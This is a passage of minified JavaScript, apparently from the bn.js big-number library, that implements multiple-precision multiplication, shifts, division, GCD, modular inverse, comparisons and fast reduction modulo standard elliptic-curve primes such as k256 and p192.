up=(B+k|0)+((v&8191)<<13)|0;B=(M+(v>>>13)|0)+(up>>>26)|0,up&=67108863,k=Math.imul(Xe,It),v=Math.imul(Xe,xt),v=v+Math.imul(He,It)|0,M=Math.imul(He,xt),k=k+Math.imul(Ze,St)|0,v=v+Math.imul(Ze,Nt)|0,v=v+Math.imul(We,St)|0,M=M+Math.imul(We,Nt)|0,k=k+Math.imul(ze,Tt)|0,v=v+Math.imul(ze,Pt)|0,v=v+Math.imul(tt,Tt)|0,M=M+Math.imul(tt,Pt)|0,k=k+Math.imul(ie,Rt)|0,v=v+Math.imul(ie,Ot)|0,v=v+Math.imul(ye,Rt)|0,M=M+Math.imul(ye,Ot)|0,k=k+Math.imul(ee,kt)|0,v=v+Math.imul(ee,Dt)|0,v=v+Math.imul(J,kt)|0,M=M+Math.imul(J,Dt)|0,k=k+Math.imul(W,Mt)|0,v=v+Math.imul(W,Bt)|0,v=v+Math.imul(K,Mt)|0,M=M+Math.imul(K,Bt)|0,k=k+Math.imul(I,Ut)|0,v=v+Math.imul(I,$t)|0,v=v+Math.imul(z,Ut)|0,M=M+Math.imul(z,$t)|0;var lp=(B+k|0)+((v&8191)<<13)|0;B=(M+(v>>>13)|0)+(lp>>>26)|0,lp&=67108863,k=Math.imul(et,It),v=Math.imul(et,xt),v=v+Math.imul(rt,It)|0,M=Math.imul(rt,xt),k=k+Math.imul(Xe,St)|0,v=v+Math.imul(Xe,Nt)|0,v=v+Math.imul(He,St)|0,M=M+Math.imul(He,Nt)|0,k=k+Math.imul(Ze,Tt)|0,v=v+Math.imul(Ze,Pt)|0,v=v+Math.imul(We,Tt)|0,M=M+Math.imul(We,Pt)|0,k=k+Math.imul(ze,Rt)|0,v=v+Math.imul(ze,Ot)|0,v=v+Math.imul(tt,Rt)|0,M=M+Math.imul(tt,Ot)|0,k=k+Math.imul(ie,kt)|0,v=v+Math.imul(ie,Dt)|0,v=v+Math.imul(ye,kt)|0,M=M+Math.imul(ye,Dt)|0,k=k+Math.imul(ee,Mt)|0,v=v+Math.imul(ee,Bt)|0,v=v+Math.imul(J,Mt)|0,M=M+Math.imul(J,Bt)|0,k=k+Math.imul(W,Ut)|0,v=v+Math.imul(W,$t)|0,v=v+Math.imul(K,Ut)|0,M=M+Math.imul(K,$t)|0,k=k+Math.imul(I,Lt)|0,v=v+Math.imul(I,Ft)|0,v=v+Math.imul(z,Lt)|0,M=M+Math.imul(z,Ft)|0;var hp=(B+k|0)+((v&8191)<<13)|0;B=(M+(v>>>13)|0)+(hp>>>26)|0,hp&=67108863,k=Math.imul(ft,It),v=Math.imul(ft,xt),v=v+Math.imul(pt,It)|0,M=Math.imul(pt,xt),k=k+Math.imul(et,St)|0,v=v+Math.imul(et,Nt)|0,v=v+Math.imul(rt,St)|0,M=M+Math.imul(rt,Nt)|0,k=k+Math.imul(Xe,Tt)|0,v=v+Math.imul(Xe,Pt)|0,v=v+Math.imul(He,Tt)|0,M=M+Math.imul(He,Pt)|0,k=k+Math.imul(Ze,Rt)|0,v=v+Math.imul(Ze,Ot)|0,v=v+Math.imul(We,Rt)|0,M=M+Math.imul(We,Ot)|0,k=k+Math.imul(ze,kt)|0,v=v+Math.imul(ze,Dt)|0,v=v+Math.imul(tt,kt)|0,M=M+Math.imul(tt,Dt)|0,k=k+Math.imul(ie,Mt)|0,v=v+Math.imul(ie,Bt)|0,v=v+Math.imul(ye,Mt)|0,M=M+Math.imul(ye,Bt)|0,k=k+Math.imul(ee,Ut)|0,v=v+Math.imul(ee,$t)|0,v=v+Math.imul(J,Ut)|0,M=M+Math.imul(J,$t)|0,k=k+Math.imul(W,Lt)|0,v=v+Math.imul(W,Ft)|0,v=v+Math.imul(K,Lt)|0,M=M+Math.imul(K,Ft)|0,k=k+Math.imul(I,jt)|0,v=v+Math.imul(I,qt)|0,v=v+Math.imul(z,jt)|0,M=M+Math.imul(z,qt)|0;var dp=(B+k|0)+((v&8191)<<13)|0;B=(M+(v>>>13)|0)+(dp>>>26)|0,dp&=67108863,k=Math.imul(_t,It),v=Math.imul(_t,xt),v=v+Math.imul(Ct,It)|0,M=Math.imul(Ct,xt),k=k+Math.imul(ft,St)|0,v=v+Math.imul(ft,Nt)|0,v=v+Math.imul(pt,St)|0,M=M+Math.imul(pt,Nt)|0,k=k+Math.imul(et,Tt)|0,v=v+Math.imul(et,Pt)|0,v=v+Math.imul(rt,Tt)|0,M=M+Math.imul(rt,Pt)|0,k=k+Math.imul(Xe,Rt)|0,v=v+Math.imul(Xe,Ot)|0,v=v+Math.imul(He,Rt)|0,M=M+Math.imul(He,Ot)|0,k=k+Math.imul(Ze,kt)|0,v=v+Math.imul(Ze,Dt)|0,v=v+Math.imul(We,kt)|0,M=M+Math.imul(We,Dt)|0,k=k+Math.imul(ze,Mt)|0,v=v+Math.imul(ze,Bt)|0,v=v+Math.imul(tt,Mt)|0,M=M+Math.imul(tt,Bt)|0,k=k+Math.imul(ie,Ut)|0,v=v+Math.imul(ie,$t)|0,v=v+Math.imul(ye,Ut)|0,M=M+Math.imul(ye,$t)|0,k=k+Math.imul(ee,Lt)|0,v=v+Math.imul(ee,Ft)|0,v=v+Math.imul(J,Lt)|0,M=M+Math.imul(J,Ft)|0,k=k+Math.imul(W,jt)|0,v=v+Math.imul(W,qt)|0,v=v+Math.imul(K,jt)|0,M=M+Math.imul(K,qt)|0,k=k+Math.imul(I,zt)|0,v=v+Math.imul(I,Ht)|0,v=v+Math.imul(z,zt)|0,M=M+Math.imul(z,Ht)|0;var fp=(B+k|0)+((v&8191)<<13)|0;B=(M+(v>>>13)|0)+(fp>>>26)|0,fp&=67108863,k=Math.imul(_t,St),v=Math.imul(_t,Nt),v=v+Math.imul(Ct,St)|0,M=Math.imul(Ct,Nt),k=k+Math.imul(ft,Tt)|0,v=v+Math.imul(ft,Pt)|0,v=v+Math.imul(pt,Tt)|0,M=M+Math.imul(pt,Pt)|0,k=k+Math.imul(et,Rt)|0,v=v+Math.imul(et,Ot)|0,v=v+Math.imul(rt,Rt)|0,M=M+Math.imul(rt,Ot)|0,k=k+Math.imul(Xe,kt)|0,v=v+Math.imul(Xe,Dt)|0,v=v+Math.imul(He,kt)|0,M=M+Math.imul(He,Dt)|0,k=k+Math.imul(Ze,Mt)|0,v=v+Math.imul(Ze,Bt)|0,v=v+Math.imul(We,Mt)|0,M=M+Math.imul(We,Bt)|0,k=k+Math.imul(ze,Ut)|0,v=v+Math.imul(ze,$t)|0,v=v+Math.imul(tt,Ut)|0,M=M+Math.imul(tt,$t)|0,k=k+Math.imul(ie,Lt)|0,v=v+Math.imul(ie,Ft)|0,v=v+Math.imul(ye,Lt)|0,M=M+Math.imul(ye,Ft)|0,k=k+Math.imul(ee,jt)|0,v=v+Math.imul(ee,qt)|0,v=v+Math.imul(J,jt)|0,M=M+Math.imul(J,qt)|0,k=k+Math.imul(W,zt)|0,v=v+Math.imul(W,Ht)|0,v=v+Math.imul(K,zt)|0,M=M+Math.imul(K,Ht)|0;var pp=(B+k|0)+((v&8191)<<13)|0;B=(M+(v>>>13)|0)+(pp>>>26)|0,pp&=67108863,k=Math.imul(_t,Tt),v=Math.imul(_t,Pt),v=v+Math.imul(Ct,Tt)|0,M=Math.imul(Ct,Pt),k=k+Math.imul(ft,Rt)|0,v=v+Math.imul(ft,Ot)|0,v=v+Math.imul(pt,Rt)|0,M=M+Math.imul(pt,Ot)|0,k=k+Math.imul(et,kt)|0,v=v+Math.imul(et,Dt)|0,v=v+Math.imul(rt,kt)|0,M=M+Math.imul(rt,Dt)|0,k=k+Math.imul(Xe,Mt)|0,v=v+Math.imul(Xe,Bt)|0,v=v+Math.imul(He,Mt)|0,M=M+Math.imul(He,Bt)|0,k=k+Math.imul(Ze,Ut)|0,v=v+Math.imul(Ze,$t)|0,v=v+Math.imul(We,Ut)|0,M=M+Math.imul(We,$t)|0,k=k+Math.imul(ze,Lt)|0,v=v+Math.imul(ze,Ft)|0,v=v+Math.imul(tt,Lt)|0,M=M+Math.imul(tt,Ft)|0,k=k+Math.imul(ie,jt)|0,v=v+Math.imul(ie,qt)|0,v=v+Math.imul(ye,jt)|0,M=M+Math.imul(ye,qt)|0,k=k+Math.imul(ee,zt)|0,v=v+Math.imul(ee,Ht)|0,v=v+Math.imul(J,zt)|0,M=M+Math.imul(J,Ht)|0;var gp=(B+k|0)+((v&8191)<<13)|0;B=(M+(v>>>13)|0)+(gp>>>26)|0,gp&=67108863,k=Math.imul(_t,Rt),v=Math.imul(_t,Ot),v=v+Math.imul(Ct,Rt)|0,M=Math.imul(Ct,Ot),k=k+Math.imul(ft,kt)|0,v=v+Math.imul(ft,Dt)|0,v=v+Math.imul(pt,kt)|0,M=M+Math.imul(pt,Dt)|0,k=k+Math.imul(et,Mt)|0,v=v+Math.imul(et,Bt)|0,v=v+Math.imul(rt,Mt)|0,M=M+Math.imul(rt,Bt)|0,k=k+Math.imul(Xe,Ut)|0,v=v+Math.imul(Xe,$t)|0,v=v+Math.imul(He,Ut)|0,M=M+Math.imul(He,$t)|0,k=k+Math.imul(Ze,Lt)|0,v=v+Math.imul(Ze,Ft)|0,v=v+Math.imul(We,Lt)|0,M=M+Math.imul(We,Ft)|0,k=k+Math.imul(ze,jt)|0,v=v+Math.imul(ze,qt)|0,v=v+Math.imul(tt,jt)|0,M=M+Math.imul(tt,qt)|0,k=k+Math.imul(ie,zt)|0,v=v+Math.imul(ie,Ht)|0,v=v+Math.imul(ye,zt)|0,M=M+Math.imul(ye,Ht)|0;var mp=(B+k|0)+((v&8191)<<13)|0;B=(M+(v>>>13)|0)+(mp>>>26)|0,mp&=67108863,k=Math.imul(_t,kt),v=Math.imul(_t,Dt),v=v+Math.imul(Ct,kt)|0,M=Math.imul(Ct,Dt),k=k+Math.imul(ft,Mt)|0,v=v+Math.imul(ft,Bt)|0,v=v+Math.imul(pt,Mt)|0,M=M+Math.imul(pt,Bt)|0,k=k+Math.imul(et,Ut)|0,v=v+Math.imul(et,$t)|0,v=v+Math.imul(rt,Ut)|0,M=M+Math.imul(rt,$t)|0,k=k+Math.imul(Xe,Lt)|0,v=v+Math.imul(Xe,Ft)|0,v=v+Math.imul(He,Lt)|0,M=M+Math.imul(He,Ft)|0,k=k+Math.imul(Ze,jt)|0,v=v+Math.imul(Ze,qt)|0,v=v+Math.imul(We,jt)|0,M=M+Math.imul(We,qt)|0,k=k+Math.imul(ze,zt)|0,v=v+Math.imul(ze,Ht)|0,v=v+Math.imul(tt,zt)|0,M=M+Math.imul(tt,Ht)|0;var yp=(B+k|0)+((v&8191)<<13)|0;B=(M+(v>>>13)|0)+(yp>>>26)|0,yp&=67108863,k=Math.imul(_t,Mt),v=Math.imul(_t,Bt),v=v+Math.imul(Ct,Mt)|0,M=Math.imul(Ct,Bt),k=k+Math.imul(ft,Ut)|0,v=v+Math.imul(ft,$t)|0,v=v+Math.imul(pt,Ut)|0,M=M+Math.imul(pt,$t)|0,k=k+Math.imul(et,Lt)|0,v=v+Math.imul(et,Ft)|0,v=v+Math.imul(rt,Lt)|0,M=M+Math.imul(rt,Ft)|0,k=k+Math.imul(Xe,jt)|0,v=v+Math.imul(Xe,qt)|0,v=v+Math.imul(He,jt)|0,M=M+Math.imul(He,qt)|0,k=k+Math.imul(Ze,zt)|0,v=v+Math.imul(Ze,Ht)|0,v=v+Math.imul(We,zt)|0,M=M+Math.imul(We,Ht)|0;var wp=(B+k|0)+((v&8191)<<13)|0;B=(M+(v>>>13)|0)+(wp>>>26)|0,wp&=67108863,k=Math.imul(_t,Ut),v=Math.imul(_t,$t),v=v+Math.imul(Ct,Ut)|0,M=Math.imul(Ct,$t),k=k+Math.imul(ft,Lt)|0,v=v+Math.imul(ft,Ft)|0,v=v+Math.imul(pt,Lt)|0,M=M+Math.imul(pt,Ft)|0,k=k+Math.imul(et,jt)|0,v=v+Math.imul(et,qt)|0,v=v+Math.imul(rt,jt)|0,M=M+Math.imul(rt,qt)|0,k=k+Math.imul(Xe,zt)|0,v=v+Math.imul(Xe,Ht)|0,v=v+Math.imul(He,zt)|0,M=M+Math.imul(He,Ht)|0;var bp=(B+k|0)+((v&8191)<<13)|0;B=(M+(v>>>13)|0)+(bp>>>26)|0,bp&=67108863,k=Math.imul(_t,Lt),v=Math.imul(_t,Ft),v=v+Math.imul(Ct,Lt)|0,M=Math.imul(Ct,Ft),k=k+Math.imul(ft,jt)|0,v=v+Math.imul(ft,qt)|0,v=v+Math.imul(pt,jt)|0,M=M+Math.imul(pt,qt)|0,k=k+Math.imul(et,zt)|0,v=v+Math.imul(et,Ht)|0,v=v+Math.imul(rt,zt)|0,M=M+Math.imul(rt,Ht)|0;var vp=(B+k|0)+((v&8191)<<13)|0;B=(M+(v>>>13)|0)+(vp>>>26)|0,vp&=67108863,k=Math.imul(_t,jt),v=Math.imul(_t,qt),v=v+Math.imul(Ct,jt)|0,M=Math.imul(Ct,qt),k=k+Math.imul(ft,zt)|0,v=v+Math.imul(ft,Ht)|0,v=v+Math.imul(pt,zt)|0,M=M+Math.imul(pt,Ht)|0;var Ep=(B+k|0)+((v&8191)<<13)|0;B=(M+(v>>>13)|0)+(Ep>>>26)|0,Ep&=67108863,k=Math.imul(_t,zt),v=Math.imul(_t,Ht),v=v+Math.imul(Ct,zt)|0,M=Math.imul(Ct,Ht);var Ap=(B+k|0)+((v&8191)<<13)|0;return B=(M+(v>>>13)|0)+(Ap>>>26)|0,Ap&=67108863,R[0]=Is,R[1]=xs,R[2]=Ss,R[3]=Ns,R[4]=Ts,R[5]=up,R[6]=lp,R[7]=hp,R[8]=dp,R[9]=fp,R[10]=pp,R[11]=gp,R[12]=mp,R[13]=yp,R[14]=wp,R[15]=bp,R[16]=vp,R[17]=Ep,R[18]=Ap,B!==0&&(R[19]=B,w.length++),w};Math.imul||(_=A);function T(N,f,p){p.negative=f.negative^N.negative,p.length=N.length+f.length;for(var w=0,E=0,x=0;x<p.length-1;x++){var R=E;E=0;for(var B=w&67108863,k=Math.min(x,f.length-1),v=Math.max(0,x-N.length+1);v<=k;v++){var M=x-v,V=N.words[M]|0,I=f.words[v]|0,z=V*I,G=z&67108863;R=R+(z/67108864|0)|0,G=G+B|0,B=G&67108863,R=R+(G>>>26)|0,E+=R>>>26,R&=67108863}p.words[x]=B,w=R,R=E}return w!==0?p.words[x]=w:p.length--,p._strip()}function P(N,f,p){return T(N,f,p)}s.prototype.mulTo=function(f,p){var w,E=this.length+f.length;return this.length===10&&f.length===10?w=_(this,f,p):E<63?w=A(this,f,p):E<1024?w=T(this,f,p):w=P(this,f,p),w},s.prototype.mul=function(f){var p=new s(null);return p.words=new Array(this.length+f.length),this.mulTo(f,p)},s.prototype.mulf=function(f){var p=new s(null);return p.words=new Array(this.length+f.length),P(this,f,p)},s.prototype.imul=function(f){return this.clone().mulTo(f,this)},s.prototype.imuln=function(f){var p=f<0;p&&(f=-f),n(typeof f=="number"),n(f<67108864);for(var w=0,E=0;E<this.length;E++){var x=(this.words[E]|0)*f,R=(x&67108863)+(w&67108863);w>>=26,w+=x/67108864|0,w+=R>>>26,this.words[E]=R&67108863}return w!==0&&(this.words[E]=w,this.length++),p?this.ineg():this},s.prototype.muln=function(f){return this.clone().imuln(f)},s.prototype.sqr=function(){return this.mul(this)},s.prototype.isqr=function(){return this.imul(this.clone())},s.prototype.pow=function(f){var p=b(f);if(p.length===0)return new s(1);for(var w=this,E=0;E<p.length&&p[E]===0;E++,w=w.sqr());if(++E<p.length)for(var x=w.sqr();E<p.length;E++,x=x.sqr())p[E]!==0&&(w=w.mul(x));return w},s.prototype.iushln=function(f){n(typeof f=="number"&&f>=0);var p=f%26,w=(f-p)/26,E=67108863>>>26-p<<26-p,x;if(p!==0){var R=0;for(x=0;x<this.length;x++){var B=this.words[x]&E,k=(this.words[x]|0)-B<<p;this.words[x]=k|R,R=B>>>26-p}R&&(this.words[x]=R,this.length++)}if(w!==0){for(x=this.length-1;x>=0;x--)this.words[x+w]=this.words[x];for(x=0;x<w;x++)this.words[x]=0;this.length+=w}return this._strip()},s.prototype.ishln=function(f){return n(this.negative===0),this.iushln(f)},s.prototype.iushrn=function(f,p,w){n(typeof f=="number"&&f>=0);var E;p?E=(p-p%26)/26:E=0;var x=f%26,R=Math.min((f-x)/26,this.length),B=67108863^67108863>>>x<<x,k=w;if(E-=R,E=Math.max(0,E),k){for(var v=0;v<R;v++)k.words[v]=this.words[v];k.length=R}if(R!==0)if(this.length>R)for(this.length-=R,v=0;v<this.length;v++)this.words[v]=this.words[v+R];else this.words[0]=0,this.length=1;var M=0;for(v=this.length-1;v>=0&&(M!==0||v>=E);v--){var V=this.words[v]|0;this.words[v]=M<<26-x|V>>>x,M=V&B}return k&&M!==0&&(k.words[k.length++]=M),this.length===0&&(this.words[0]=0,this.length=1),this._strip()},s.prototype.ishrn=function(f,p,w){return n(this.negative===0),this.iushrn(f,p,w)},s.prototype.shln=function(f){return this.clone().ishln(f)},s.prototype.ushln=function(f){return this.clone().iushln(f)},s.prototype.shrn=function(f){return this.clone().ishrn(f)},s.prototype.ushrn=function(f){return this.clone().iushrn(f)},s.prototype.testn=function(f){n(typeof f=="number"&&f>=0);var p=f%26,w=(f-p)/26,E=1<<p;if(this.length<=w)return!1;var x=this.words[w];return!!(x&E)},s.prototype.imaskn=function(f){n(typeof f=="number"&&f>=0);var p=f%26,w=(f-p)/26;if(n(this.negative===0,"imaskn works only with positive numbers"),this.length<=w)return this;if(p!==0&&w++,this.length=Math.min(w,this.length),p!==0){var E=67108863^67108863>>>p<<p;this.words[this.length-1]&=E}return this._strip()},s.prototype.maskn=function(f){return this.clone().imaskn(f)},s.prototype.iaddn=function(f){return n(typeof f=="number"),n(f<67108864),f<0?this.isubn(-f):this.negative!==0?this.length===1&&(this.words[0]|0)<=f?(this.words[0]=f-(this.words[0]|0),this.negative=0,this):(this.negative=0,this.isubn(f),this.negative=1,this):this._iaddn(f)},s.prototype._iaddn=function(f){this.words[0]+=f;for(var p=0;p<this.length&&this.words[p]>=67108864;p++)this.words[p]-=67108864,p===this.length-1?this.words[p+1]=1:this.words[p+1]++;return this.length=Math.max(this.length,p+1),this},s.prototype.isubn=function(f){if(n(typeof f=="number"),n(f<67108864),f<0)return this.iaddn(-f);if(this.negative!==0)return this.negative=0,this.iaddn(f),this.negative=1,this;if(this.words[0]-=f,this.length===1&&this.words[0]<0)this.words[0]=-this.words[0],this.negative=1;else for(var p=0;p<this.length&&this.words[p]<0;p++)this.words[p]+=67108864,this.words[p+1]-=1;return this._strip()},s.prototype.addn=function(f){return this.clone().iaddn(f)},s.prototype.subn=function(f){return this.clone().isubn(f)},s.prototype.iabs=function(){return this.negative=0,this},s.prototype.abs=function(){return this.clone().iabs()},s.prototype._ishlnsubmul=function(f,p,w){var E=f.length+w,x;this._expand(E);var R,B=0;for(x=0;x<f.length;x++){R=(this.words[x+w]|0)+B;var k=(f.words[x]|0)*p;R-=k&67108863,B=(R>>26)-(k/67108864|0),this.words[x+w]=R&67108863}for(;x<this.length-w;x++)R=(this.words[x+w]|0)+B,B=R>>26,this.words[x+w]=R&67108863;if(B===0)return this._strip();for(n(B===-1),B=0,x=0;x<this.length;x++)R=-(this.words[x]|0)+B,B=R>>26,this.words[x]=R&67108863;return this.negative=1,this._strip()},s.prototype._wordDiv=function(f,p){var w=this.length-f.length,E=this.clone(),x=f,R=x.words[x.length-1]|0,B=this._countBits(R);w=26-B,w!==0&&(x=x.ushln(w),E.iushln(w),R=x.words[x.length-1]|0);var k=E.length-x.length,v;if(p!=="mod"){v=new s(null),v.length=k+1,v.words=new Array(v.length);for(var M=0;M<v.length;M++)v.words[M]=0}var V=E.clone()._ishlnsubmul(x,1,k);V.negative===0&&(E=V,v&&(v.words[k]=1));for(var I=k-1;I>=0;I--){var z=(E.words[x.length+I]|0)*67108864+(E.words[x.length+I-1]|0);for(z=Math.min(z/R|0,67108863),E._ishlnsubmul(x,z,I);E.negative!==0;)z--,E.negative=0,E._ishlnsubmul(x,1,I),E.isZero()||(E.negative^=1);v&&(v.words[I]=z)}return v&&v._strip(),E._strip(),p!=="div"&&w!==0&&E.iushrn(w),{div:v||null,mod:E}},s.prototype.divmod=function(f,p,w){if(n(!f.isZero()),this.isZero())return{div:new s(0),mod:new s(0)};var E,x,R;return this.negative!==0&&f.negative===0?(R=this.neg().divmod(f,p),p!=="mod"&&(E=R.div.neg()),p!=="div"&&(x=R.mod.neg(),w&&x.negative!==0&&x.iadd(f)),{div:E,mod:x}):this.negative===0&&f.negative!==0?(R=this.divmod(f.neg(),p),p!=="mod"&&(E=R.div.neg()),{div:E,mod:R.mod}):(this.negative&f.negative)!==0?(R=this.neg().divmod(f.neg(),p),p!=="div"&&(x=R.mod.neg(),w&&x.negative!==0&&x.isub(f)),{div:R.div,mod:x}):f.length>this.length||this.cmp(f)<0?{div:new s(0),mod:this}:f.length===1?p==="div"?{div:this.divn(f.words[0]),mod:null}:p==="mod"?{div:null,mod:new s(this.modrn(f.words[0]))}:{div:this.divn(f.words[0]),mod:new s(this.modrn(f.words[0]))}:this._wordDiv(f,p)},s.prototype.div=function(f){return this.divmod(f,"div",!1).div},s.prototype.mod=function(f){return this.divmod(f,"mod",!1).mod},s.prototype.umod=function(f){return this.divmod(f,"mod",!0).mod},s.prototype.divRound=function(f){var p=this.divmod(f);if(p.mod.isZero())return p.div;var w=p.div.negative!==0?p.mod.isub(f):p.mod,E=f.ushrn(1),x=f.andln(1),R=w.cmp(E);return R<0||x===1&&R===0?p.div:p.div.negative!==0?p.div.isubn(1):p.div.iaddn(1)},s.prototype.modrn=function(f){var p=f<0;p&&(f=-f),n(f<=67108863);for(var w=(1<<26)%f,E=0,x=this.length-1;x>=0;x--)E=(w*E+(this.words[x]|0))%f;return p?-E:E},s.prototype.modn=function(f){return this.modrn(f)},s.prototype.idivn=function(f){var p=f<0;p&&(f=-f),n(f<=67108863);for(var w=0,E=this.length-1;E>=0;E--){var x=(this.words[E]|0)+w*67108864;this.words[E]=x/f|0,w=x%f}return this._strip(),p?this.ineg():this},s.prototype.divn=function(f){return this.clone().idivn(f)},s.prototype.egcd=function(f){n(f.negative===0),n(!f.isZero());var p=this,w=f.clone();p.negative!==0?p=p.umod(f):p=p.clone();for(var E=new s(1),x=new s(0),R=new s(0),B=new s(1),k=0;p.isEven()&&w.isEven();)p.iushrn(1),w.iushrn(1),++k;for(var v=w.clone(),M=p.clone();!p.isZero();){for(var V=0,I=1;(p.words[0]&I)===0&&V<26;++V,I<<=1);if(V>0)for(p.iushrn(V);V-- >0;)(E.isOdd()||x.isOdd())&&(E.iadd(v),x.isub(M)),E.iushrn(1),x.iushrn(1);for(var z=0,G=1;(w.words[0]&G)===0&&z<26;++z,G<<=1);if(z>0)for(w.iushrn(z);z-- >0;)(R.isOdd()||B.isOdd())&&(R.iadd(v),B.isub(M)),R.iushrn(1),B.iushrn(1);p.cmp(w)>=0?(p.isub(w),E.isub(R),x.isub(B)):(w.isub(p),R.isub(E),B.isub(x))}return{a:R,b:B,gcd:w.iushln(k)}},s.prototype._invmp=function(f){n(f.negative===0),n(!f.isZero());var p=this,w=f.clone();p.negative!==0?p=p.umod(f):p=p.clone();for(var E=new s(1),x=new s(0),R=w.clone();p.cmpn(1)>0&&w.cmpn(1)>0;){for(var B=0,k=1;(p.words[0]&k)===0&&B<26;++B,k<<=1);if(B>0)for(p.iushrn(B);B-- >0;)E.isOdd()&&E.iadd(R),E.iushrn(1);for(var v=0,M=1;(w.words[0]&M)===0&&v<26;++v,M<<=1);if(v>0)for(w.iushrn(v);v-- >0;)x.isOdd()&&x.iadd(R),x.iushrn(1);p.cmp(w)>=0?(p.isub(w),E.isub(x)):(w.isub(p),x.isub(E))}var V;return p.cmpn(1)===0?V=E:V=x,V.cmpn(0)<0&&V.iadd(f),V},s.prototype.gcd=function(f){if(this.isZero())return f.abs();if(f.isZero())return this.abs();var p=this.clone(),w=f.clone();p.negative=0,w.negative=0;for(var E=0;p.isEven()&&w.isEven();E++)p.iushrn(1),w.iushrn(1);do{for(;p.isEven();)p.iushrn(1);for(;w.isEven();)w.iushrn(1);var x=p.cmp(w);if(x<0){var R=p;p=w,w=R}else if(x===0||w.cmpn(1)===0)break;p.isub(w)}while(!0);return w.iushln(E)},s.prototype.invm=function(f){return this.egcd(f).a.umod(f)},s.prototype.isEven=function(){return(this.words[0]&1)===0},s.prototype.isOdd=function(){return(this.words[0]&1)===1},s.prototype.andln=function(f){return this.words[0]&f},s.prototype.bincn=function(f){n(typeof f=="number");var p=f%26,w=(f-p)/26,E=1<<p;if(this.length<=w)return this._expand(w+1),this.words[w]|=E,this;for(var x=E,R=w;x!==0&&R<this.length;R++){var B=this.words[R]|0;B+=x,x=B>>>26,B&=67108863,this.words[R]=B}return x!==0&&(this.words[R]=x,this.length++),this},s.prototype.isZero=function(){return this.length===1&&this.words[0]===0},s.prototype.cmpn=function(f){var p=f<0;if(this.negative!==0&&!p)return-1;if(this.negative===0&&p)return 1;this._strip();var w;if(this.length>1)w=1;else{p&&(f=-f),n(f<=67108863,"Number is too big");var E=this.words[0]|0;w=E===f?0:E<f?-1:1}return this.negative!==0?-w|0:w},s.prototype.cmp=function(f){if(this.negative!==0&&f.negative===0)return-1;if(this.negative===0&&f.negative!==0)return 1;var p=this.ucmp(f);return this.negative!==0?-p|0:p},s.prototype.ucmp=function(f){if(this.length>f.length)return 1;if(this.length<f.length)return-1;for(var p=0,w=this.length-1;w>=0;w--){var E=this.words[w]|0,x=f.words[w]|0;if(E!==x){E<x?p=-1:E>x&&(p=1);break}}return p},s.prototype.gtn=function(f){return this.cmpn(f)===1},s.prototype.gt=function(f){return this.cmp(f)===1},s.prototype.gten=function(f){return this.cmpn(f)>=0},s.prototype.gte=function(f){return this.cmp(f)>=0},s.prototype.ltn=function(f){return this.cmpn(f)===-1},s.prototype.lt=function(f){return this.cmp(f)===-1},s.prototype.lten=function(f){return this.cmpn(f)<=0},s.prototype.lte=function(f){return this.cmp(f)<=0},s.prototype.eqn=function(f){return this.cmpn(f)===0},s.prototype.eq=function(f){return this.cmp(f)===0},s.red=function(f){return new j(f)},s.prototype.toRed=function(f){return n(!this.red,"Already a number in reduction context"),n(this.negative===0,"red works only with positives"),f.convertTo(this)._forceRed(f)},s.prototype.fromRed=function(){return n(this.red,"fromRed works only with numbers in reduction context"),this.red.convertFrom(this)},s.prototype._forceRed=function(f){return this.red=f,this},s.prototype.forceRed=function(f){return n(!this.red,"Already a number in reduction context"),this._forceRed(f)},s.prototype.redAdd=function(f){return n(this.red,"redAdd works only with red numbers"),this.red.add(this,f)},s.prototype.redIAdd=function(f){return n(this.red,"redIAdd works only with red numbers"),this.red.iadd(this,f)},s.prototype.redSub=function(f){return n(this.red,"redSub works only with red numbers"),this.red.sub(this,f)},s.prototype.redISub=function(f){return n(this.red,"redISub works only with red numbers"),this.red.isub(this,f)},s.prototype.redShl=function(f){return n(this.red,"redShl works only with red numbers"),this.red.shl(this,f)},s.prototype.redMul=function(f){return n(this.red,"redMul works only with red numbers"),this.red._verify2(this,f),this.red.mul(this,f)},s.prototype.redIMul=function(f){return n(this.red,"redMul works only with red numbers"),this.red._verify2(this,f),this.red.imul(this,f)},s.prototype.redSqr=function(){return n(this.red,"redSqr works only with red numbers"),this.red._verify1(this),this.red.sqr(this)},s.prototype.redISqr=function(){return n(this.red,"redISqr works only with red numbers"),this.red._verify1(this),this.red.isqr(this)},s.prototype.redSqrt=function(){return n(this.red,"redSqrt works only with red numbers"),this.red._verify1(this),this.red.sqrt(this)},s.prototype.redInvm=function(){return n(this.red,"redInvm works only with red numbers"),this.red._verify1(this),this.red.invm(this)},s.prototype.redNeg=function(){return n(this.red,"redNeg works only with red numbers"),this.red._verify1(this),this.red.neg(this)},s.prototype.redPow=function(f){return n(this.red&&!f.red,"redPow(normalNum)"),this.red._verify1(this),this.red.pow(this,f)};var S={k256:null,p224:null,p192:null,p25519:null};function C(N,f){this.name=N,this.p=new s(f,16),this.n=this.p.bitLength(),this.k=new s(1).iushln(this.n).isub(this.p),this.tmp=this._tmp()}C.prototype._tmp=function(){var f=new s(null);return f.words=new Array(Math.ceil(this.n/13)),f},C.prototype.ireduce=function(f){var p=f,w;do this.split(p,this.tmp),p=this.imulK(p),p=p.iadd(this.tmp),w=p.bitLength();while(w>this.n);var E=w<this.n?-1:p.ucmp(this.p);return E===0?(p.words[0]=0,p.length=1):E>0?p.isub(this.p):p.strip!==void 0?p.strip():p._strip(),p},C.prototype.split=function(f,p){f.iushrn(this.n,0,p)},C.prototype.imulK=function(f){return f.imul(this.k)};function O(){C.call(this,"k256","ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff fffffffe fffffc2f")}i(O,C),O.prototype.split=function(f,p){for(var w=4194303,E=Math.min(f.length,9),x=0;x<E;x++)p.words[x]=f.words[x];if(p.length=E,f.length<=9){f.words[0]=0,f.length=1;return}var R=f.words[9];for(p.words[p.length++]=R&w,x=10;x<f.length;x++){var B=f.words[x]|0;f.words[x-10]=(B&w)<<4|R>>>22,R=B}R>>>=22,f.words[x-10]=R,R===0&&f.length>10?f.length-=10:f.length-=9},O.prototype.imulK=function(f){f.words[f.length]=0,f.words[f.length+1]=0,f.length+=2;for(var p=0,w=0;w<f.length;w++){var E=f.words[w]|0;p+=E*977,f.words[w]=p&67108863,p=E*64+(p/67108864|0)}return f.words[f.length-1]===0&&(f.length--,f.words[f.length-1]===0&&f.length--),f};function $(){C.call(this,"p224","ffffffff ffffffff ffffffff ffffffff 00000000 00000000 00000001")}i($,C);function D(){C.call(this,"p192","ffffffff ffffffff ffffffff fffffffe ffffffff ffffffff")}i(D,C);function F(){C.call(this,"25519","7fffffffffffffff ffffffffffffffff 